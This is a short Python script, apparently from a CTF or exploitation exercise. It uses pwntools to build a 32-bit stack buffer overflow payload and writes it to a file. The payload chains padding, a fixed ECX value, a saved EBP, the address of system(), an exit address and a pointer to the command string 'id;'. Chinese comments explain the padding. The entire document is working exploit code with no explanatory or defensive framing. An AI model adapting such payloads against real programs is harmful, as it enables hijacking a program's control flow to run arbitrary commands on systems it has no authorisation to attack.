from pwn import *
ECX_FIX_ADDR = p32(0xffffcc50)
SYSTEM_ADDR = p32(0x0804cc70)
EAX_ADDR = p32(0xffffcc34)
EXIT_ADDR = p32(0x804c780)
EBP_FIX_ADDR = p32(0xffffcc70)

payload = b'id;\x00' + b'B'*8 # str padding
payload += ECX_FIX_ADDR + b'C' * 4 # ffffcc40 到ebp的填充 其中 0xffffcc50这个是平衡ecx的
payload += EBP_FIX_ADDR
payload += SYSTEM_ADDR # system address
payload += EXIT_ADDR # return address
payload += EAX_ADDR # id;\x00 address 

with open('p1.bin','wb')as f:
  f.write(payload)
